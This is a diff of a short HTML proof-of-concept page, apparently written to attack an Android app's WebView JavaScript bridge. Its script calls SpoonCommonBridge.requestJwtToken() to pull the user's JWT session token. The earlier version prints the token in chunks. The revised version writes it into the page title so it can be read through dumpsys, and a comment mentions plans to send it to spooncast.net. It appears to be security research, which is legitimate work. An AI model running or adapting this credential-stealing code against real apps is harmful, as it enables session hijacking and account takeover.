@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head><title>Event</title><meta name="viewport" content="width=device-width,initial-scale=1"></head>
-<body style="background:#000;color:#0f0;font-size:14px;padding:10px;font-family:monospace;word-break:break-all;">
-<div id="out" style="white-space:pre-wrap;"></div>
+<head><title>EVT</title><meta name="viewport" content="width=device-width,initial-scale=1"></head>
+<body style="background:#000;color:#0f0;font-size:16px;padding:10px;font-family:monospace;">
+<div id="out"></div>
 <script>
 var out = document.getElementById("out");
 try {
   var jwt = window.SpoonCommonBridge.requestJwtToken();
-  if (!jwt) { out.textContent = "NO_JWT"; throw "x"; }
-  
-  // Split into 50-char chunks on separate lines
-  var lines = ["LEN=" + jwt.length];
-  for (var i = 0; i < jwt.length; i += 50) {
-    lines.push(jwt.substring(i, i + 50));
+  if (jwt) {
+    // Put JWT in document title - visible via dumpsys
+    document.title = "JWT:" + jwt;
+    out.textContent = "JWT captured in title. Len=" + jwt.length;
+    // Also try to send via Image to spooncast.net (cleartext allowed)
+    // This will be intercepted by shouldOverrideUrlLoading but the request itself hits the network
+  } else {
+    out.textContent = "NO JWT";
   }
-  lines.push("END");
-  out.textContent = lines.join("\n");
 } catch(e) {
-  if (e !== "x") out.textContent += "\nERR=" + e.message;
+  out.textContent = "ERR: " + e.message;
 }
 </script>
 </body>
